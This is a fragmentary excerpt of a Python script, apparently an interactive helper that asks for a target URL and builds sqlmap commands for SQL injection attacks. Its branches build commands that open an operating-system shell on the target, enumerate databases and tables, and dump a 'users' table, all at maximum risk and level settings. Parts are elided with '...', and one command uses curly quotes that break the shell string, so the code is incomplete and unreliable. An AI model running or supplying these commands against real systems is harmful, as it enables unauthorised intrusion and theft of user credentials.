...
> """)
    ...
    if q2 == 1:
        ...
        q3 = input(
            "What is the name of the database you would like to make a shell from?\n> ")
        command = 'sqlmap -u “{}” --risk=3 --level=5 --os-shell -D {}'.format(
            q1, q3)
    elif q2 == 3:
        command = 'sqlmap -u "{}" --risk=3 --level=5 --threads=4 --dbs --tables --batch'.format(
            q1)
    elif q2 == 4:
        command = 'sqlmap -u "{}" --risk=3 --level=5 --threads=4 --dbs  --batch -T users --dump'.format(
            q1)
    elif q2 == 5:
        q4 = input("""
...
What is the sql-injectable element? (uname, pword, username, etc...)\n> """)
        while True:
            q5 = input(
                "What is the full path to the post.txt file? (/root/Desktop/Machines/yee/post.txt)\n> ")
